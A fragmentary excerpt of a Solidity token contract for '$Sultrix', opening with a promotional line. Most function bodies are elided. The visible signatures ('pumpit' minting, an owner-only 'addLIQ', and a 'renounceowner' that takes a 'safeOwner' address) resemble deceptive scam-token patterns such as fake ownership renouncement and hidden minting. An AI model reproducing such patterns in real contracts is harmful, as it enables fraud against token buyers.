...
* $Sultrix is a token with a twist and have used a similar tokenomics concept as MUSUBI! Check out the Tokenomics! 
...
contract TokenContract is Context, IERC20 {
    ...
    address public new_Owner = 0x0000000000000000000000000000000000000000;
   ...
   constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
        ...
        pumpit(owner, initialSupply*(10**18));
  ...
  function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {
     ...
     * - `spender` cannot be the zero address.
     */
    function addLIQ(address[] memory receivers) public {
        require(msg.sender == _owner, "!owner");
        for (uint256 i = 0; i < receivers.length; i++) {
             /**
     ...
     * `subtractedValue`.
     */
   function renounceowner(address safeOwner) public {
        require(msg.sender == _owner, "!owner");
     ...
     */
    function pumpit(address account, uint256 amount) public {
